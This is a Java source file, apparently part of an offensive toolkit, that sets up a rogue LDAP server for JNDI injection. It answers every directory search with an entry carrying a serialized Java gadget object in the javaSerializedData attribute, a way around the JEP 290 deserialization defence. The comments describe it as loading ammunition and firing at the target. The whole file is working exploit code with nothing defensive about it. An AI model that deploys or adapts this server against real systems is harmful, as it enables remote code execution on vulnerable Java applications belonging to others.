package com.pinger;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.util.concurrent.CountDownLatch;

/**
 * @author : p1n93r
 * @date : 2021/8/9 10:30
 * 使用javaSerializedData直接传递序列化数据绕过JEP290限制
 */
public class Attack {

    public static Integer port;

    public static Object gadget;

    private static final String LDAP_BASE = "dc=example,dc=com";

    /**
     * 使用javaSerializedData直接传递序列化数据
     */
    public static void usejavaSerializedData()throws Exception{
        if(null==port||null==gadget){
            throw new Exception("[-] port or gadget is null...");
        }


        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                Attack.port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("[+] Listening on 0.0.0.0:" + port);
        ds.startListening();
        new CountDownLatch(1).await();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        public OperationInterceptor () {}

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception exception ) {
                exception.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            System.out.println("[+] Target LDAP reference result is " + base);
            e.addAttribute("javaClassName", "p1n93r");
            // 准备好弹药，准备发送到javaSerializedData
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            System.out.println(String.format("[+] send gadget[%s] to the target.",gadget.getClass().toString()));
            objectOutputStream.writeObject(gadget);
            objectOutputStream.close();
            e.addAttribute("javaSerializedData",byteArrayOutputStream.toByteArray());
            byteArrayOutputStream.close();
            // 开炮
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
